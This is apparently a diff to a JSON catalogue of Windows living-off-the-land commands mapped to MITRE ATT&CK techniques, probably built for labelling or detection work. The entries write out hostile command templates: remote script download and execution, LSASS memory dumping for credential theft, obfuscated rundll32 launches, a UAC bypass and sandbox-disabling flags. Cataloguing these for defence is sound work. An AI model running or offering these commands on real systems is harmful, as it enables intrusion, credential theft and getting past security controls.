+        "Description":"Executes JScript or VBScript embedded in the target remote XSL stylsheet. The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":230,
+        "Command":"wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"",
+        "Description":"Copy file from source to destination. The WMI command-line (WMIC) utility provides a command-line interface for WMI",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":231,
         "Command":"WorkFolders",
         "Description":"Execute control.exe in the current working directory Work Folders",
         "RiskScore":"",
@@ -1344,7 +2772,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":113,
+        "ID":232,
         "Command":"wscript \/\/e:vbscript {PATH}:script.vbs",
         "Description":"Execute script stored in an alternate data stream Used by Windows to execute scripts",
         "RiskScore":"",
@@ -1356,7 +2784,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":114,
+        "ID":233,
+        "Command":"echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",
+        "Description":"Download and execute script stored in an alternate data stream Used by Windows to execute scripts",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":234,
         "Command":"wsreset.exe",
         "Description":"During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user. Used to reset Windows Store settings according to its manifest file",
         "RiskScore":"",
@@ -1368,7 +2808,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":115,
+        "ID":235,
         "Command":"wuauclt.exe \/UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} \/RunHandlerComServer",
         "Description":"Loads and executes DLL code on attach. Windows Update Client",
         "RiskScore":"",
@@ -1380,7 +2820,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":116,
+        "ID":236,
         "Command":"xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}",
         "Description":"Xwizard.exe running a custom class that has been added to the registry. Execute custom class that has been added to the registry or download a file with Xwizard.exe",
         "RiskScore":"",
@@ -1392,7 +2832,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":117,
+        "ID":237,
+        "Command":"xwizard RunWizard \/taero \/u {00000001-0000-0000-0000-0000FEEDACDC}",
+        "Description":"Xwizard.exe running a custom class that has been added to the registry. The \/t and \/u switch prevent an error message in later Windows 10 builds. Execute custom class that has been added to the registry or download a file with Xwizard.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":238,
+        "Command":"xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} \/z{REMOTEURL}",
+        "Description":"Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache. Execute custom class that has been added to the registry or download a file with Xwizard.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":239,
         "Command":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}",
         "Description":"msedge_proxy will download malicious file. Microsoft Edge Browser",
         "RiskScore":"",
@@ -1404,7 +2868,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":118,
+        "ID":240,
+        "Command":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "Description":"msedge_proxy.exe will execute file in the background Microsoft Edge Browser",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":241,
         "Command":"msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"",
         "Description":"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess. msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
         "RiskScore":"",
@@ -1416,7 +2892,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":119,
+        "ID":242,
+        "Command":"msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"",
+        "Description":"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess. msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":243,
+        "Command":"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"",
+        "Description":"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess. msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":244,
+        "Command":"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\"",
+        "Description":"This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess. msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.015",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":245,
         "Command":"wt.exe {CMD}",
         "Description":"Execute a command via Windows Terminal. Windows Terminal",
         "RiskScore":"",
@@ -1428,7 +2940,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":120,
+        "ID":246,
         "Command":"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",
         "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Utility for installing software and drivers with rundll32.exe",
         "RiskScore":"",
@@ -1440,7 +2952,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":121,
+        "ID":247,
+        "Command":"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",
+        "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied). Utility for installing software and drivers with rundll32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":248,
+        "Command":"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",
+        "Description":"Launch a DLL payload by calling the RegisterOCX function. Utility for installing software and drivers with rundll32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":249,
+        "Command":"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",
+        "Description":"Launch an executable by calling the RegisterOCX function. Utility for installing software and drivers with rundll32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":250,
+        "Command":"rundll32 advpack.dll, RegisterOCX {CMD}",
+        "Description":"Launch command line by calling the RegisterOCX function. Utility for installing software and drivers with rundll32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":251,
         "Command":"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",
         "Description":"Launch an executable with a .scr extension by calling the InstallScreenSaver function. Desktop Settings Control Panel",
         "RiskScore":"",
@@ -1452,7 +3012,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":122,
+        "ID":252,
+        "Command":"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",
+        "Description":"Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function. Desktop Settings Control Panel",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":253,
         "Command":"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
         "Description":"Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host) ClickOnce engine in Windows used by .NET",
         "RiskScore":"",
@@ -1464,7 +3036,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":123,
+        "ID":254,
         "Command":"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",
         "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
         "RiskScore":"",
@@ -1476,7 +3048,55 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":124,
+        "ID":255,
+        "Command":"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",
+        "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied). INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":256,
+        "Command":"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",
+        "Description":"Launch a DLL payload by calling the RegisterOCX function. INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":257,
+        "Command":"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",
+        "Description":"Launch an executable by calling the RegisterOCX function. INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":258,
+        "Command":"rundll32 ieadvpack.dll, RegisterOCX {CMD}",
+        "Description":"Launch command line by calling the RegisterOCX function. INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":259,
         "Command":"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",
         "Description":"Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL. Internet Browser DLL for translating HTML code.",
         "RiskScore":"",
@@ -1488,7 +3108,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":125,
+        "ID":260,
         "Command":"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",
         "Description":"Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box). Microsoft HTML Viewer",
         "RiskScore":"",
@@ -1500,7 +3120,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":126,
+        "ID":261,
         "Command":"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",
         "Description":"Launch executable by calling the LaunchApplication function. Microsoft HTML Viewer",
         "RiskScore":"",
@@ -1512,7 +3132,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":127,
+        "ID":262,
         "Command":"rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}",
         "Description":"Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache. Windows Script Component Runtime",
         "RiskScore":"",
@@ -1524,7 +3144,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":128,
+        "ID":263,
         "Command":"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
         "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Windows Setup Application Programming Interface",
         "RiskScore":"",
@@ -1536,7 +3156,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":129,
+        "ID":264,
+        "Command":"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+        "Description":"Launch an executable file via the InstallHinfSection function and .inf file section directive. Windows Setup Application Programming Interface",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":265,
         "Command":"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",
         "Description":"Launch an executable payload via proxy through a URL (information) file by calling OpenURL. Shell Doc Object and Control Library.",
         "RiskScore":"",
@@ -1548,7 +3180,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":130,
+        "ID":266,
         "Command":"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",
         "Description":"Launch a DLL payload by calling the Control_RunDLL function. Windows Shell Common Dll",
         "RiskScore":"",
@@ -1560,7 +3192,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":131,
+        "ID":267,
+        "Command":"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",
+        "Description":"Launch an executable by calling the ShellExec_RunDLL function. Windows Shell Common Dll",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":268,
+        "Command":"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",
+        "Description":"Launch command line by calling the ShellExec_RunDLL function. Windows Shell Common Dll",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":269,
         "Command":"rundll32.exe c:\\Windows\\System32\\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",
         "Description":"Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'. Photo Gallery Viewer",
         "RiskScore":"",
@@ -1572,7 +3228,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":132,
+        "ID":270,
         "Command":"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
         "Description":"Execute the specified (local or remote) .wsh\/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Windows NT System Setup",
         "RiskScore":"",
@@ -1584,7 +3240,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":133,
+        "ID":271,
+        "Command":"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+        "Description":"Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive. Windows NT System Setup",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":272,
         "Command":"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",
         "Description":"Launch a HTML application payload by calling OpenURL. Internet Shortcut Shell Extension DLL.",
         "RiskScore":"",
@@ -1596,7 +3264,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":134,
+        "ID":273,
+        "Command":"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",
+        "Description":"Launch an executable payload via proxy through a .url (information) file by calling OpenURL. Internet Shortcut Shell Extension DLL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":274,
+        "Command":"rundll32.exe url.dll,OpenURL file:\/\/^C^:^\/^W^i^n^d^o^w^s^\/^s^y^s^t^e^m^3^2^\/^c^a^l^c^.^e^x^e",
+        "Description":"Launch an executable by calling OpenURL. Internet Shortcut Shell Extension DLL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":275,
+        "Command":"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",
+        "Description":"Launch an executable by calling FileProtocolHandler. Internet Shortcut Shell Extension DLL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":276,
+        "Command":"rundll32.exe url.dll,FileProtocolHandler file:\/\/^C^:^\/^W^i^n^d^o^w^s^\/^s^y^s^t^e^m^3^2^\/^c^a^l^c^.^e^x^e",
+        "Description":"Launch an executable by calling FileProtocolHandler. Internet Shortcut Shell Extension DLL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":277,
+        "Command":"rundll32.exe url.dll,FileProtocolHandler file:\/\/\/C:\/test\/test.hta",
+        "Description":"Launch a HTML application payload by calling FileProtocolHandler. Internet Shortcut Shell Extension DLL.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":278,
         "Command":"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",
         "Description":"Launch an executable payload by calling RouteTheCall. Compressed Folder library",
         "RiskScore":"",
@@ -1608,7 +3336,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":135,
+        "ID":279,
+        "Command":"rundll32.exe zipfldr.dll,RouteTheCall file:\/\/^C^:^\/^W^i^n^d^o^w^s^\/^s^y^s^t^e^m^3^2^\/^c^a^l^c^.^e^x^e",
+        "Description":"Launch an executable payload by calling RouteTheCall (obfuscated). Compressed Folder library",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.011",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":280,
         "Command":"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full",
         "Description":"Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump. COM+ Services",
         "RiskScore":"",
@@ -1620,7 +3360,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":136,
+        "ID":281,
         "Command":"AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
         "Description":"Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name. Verifies UI accessibility requirements",
         "RiskScore":"",
@@ -1632,7 +3372,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":137,
+        "ID":282,
+        "Command":"AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
+        "Description":"Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name. Verifies UI accessibility requirements",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":283,
         "Command":"adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet",
         "Description":"Creates a memory dump of the lsass process Debugging tool included with Windows Debugging Tools",
         "RiskScore":"",
@@ -1644,7 +3396,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":138,
+        "ID":284,
+        "Command":"adplus.exe -c {PATH:.xml}",
+        "Description":"Execute arbitrary commands using adplus config file (see Resources section for a sample file). Debugging tool included with Windows Debugging Tools",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":285,
+        "Command":"adplus.exe -c {PATH:.xml}",
+        "Description":"Dump process memory using adplus config file (see Resources section for a sample file). Debugging tool included with Windows Debugging Tools",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":286,
+        "Command":"adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}",
+        "Description":"Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required. Debugging tool included with Windows Debugging Tools",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":287,
         "Command":"AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1",
         "Description":"Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument Intune Management Extension included on Intune Managed Devices",
         "RiskScore":"",
@@ -1656,7 +3444,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":139,
+        "ID":288,
+        "Command":"AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1",
+        "Description":"If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will execute it successfully Intune Management Extension included on Intune Managed Devices",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":289,
         "Command":"appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}",
         "Description":"Execute an executable file via the Windows App Certification Kit command-line tool. Windows App Certification Kit command-line tool.",
         "RiskScore":"",
@@ -1668,7 +3468,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":140,
+        "ID":290,
+        "Command":"appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline \/q -reportoutputpath {PATH_ABSOLUTE:.xml}",
+        "Description":"Install an MSI file via an msiexec instance spawned via appcert.exe as parent process. Windows App Certification Kit command-line tool.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.007",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":291,
         "Command":"AppVLP.exe {PATH_SMB:.bat}",
         "Description":"Executes .bat file through AppVLP.exe Application Virtualization Utility Included with Microsoft Office 2016",
         "RiskScore":"",
@@ -1680,7 +3492,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":141,
+        "ID":292,
+        "Command":"AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\"",
+        "Description":"Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command. Application Virtualization Utility Included with Microsoft Office 2016",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":293,
         "Command":"bginfo.exe {PATH:.bgi} \/popup \/nolicprompt",
         "Description":"Execute VBscript code that is referenced within the specified .bgi file. Background Information Utility included with SysInternals Suite",
         "RiskScore":"",
@@ -1692,7 +3516,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":142,
+        "ID":294,
+        "Command":"bginfo.exe {PATH:.bgi} \/popup \/nolicprompt",
+        "Description":"Execute VBscript code that is referenced within the specified .bgi file. Background Information Utility included with SysInternals Suite",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":295,
+        "Command":"\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} \/popup \/nolicprompt",
+        "Description":"Execute bginfo.exe from a WebDAV server. Background Information Utility included with SysInternals Suite",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":296,
+        "Command":"\\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi} \/popup \/nolicprompt",
+        "Description":"Execute bginfo.exe from a WebDAV server. Background Information Utility included with SysInternals Suite",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":297,
+        "Command":"\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} \/popup \/nolicprompt",
+        "Description":"This style of execution may not longer work due to patch. Background Information Utility included with SysInternals Suite",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":298,
+        "Command":"\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} \/popup \/nolicprompt",
+        "Description":"This style of execution may not longer work due to patch. Background Information Utility included with SysInternals Suite",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":299,
         "Command":"cdb.exe -cf {PATH:.wds} -o notepad.exe",
         "Description":"Launch 64-bit shellcode from the specified .wds file using cdb.exe. Debugging tool included with Windows Debugging Tools.",
         "RiskScore":"",
@@ -1704,7 +3588,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":143,
+        "ID":300,
+        "Command":"cdb.exe -pd -pn {process_name}\n.shell {CMD}",
+        "Description":"Attaching to any process and executing shell commands. Debugging tool included with Windows Debugging Tools.",
+        "RiskScore":"",
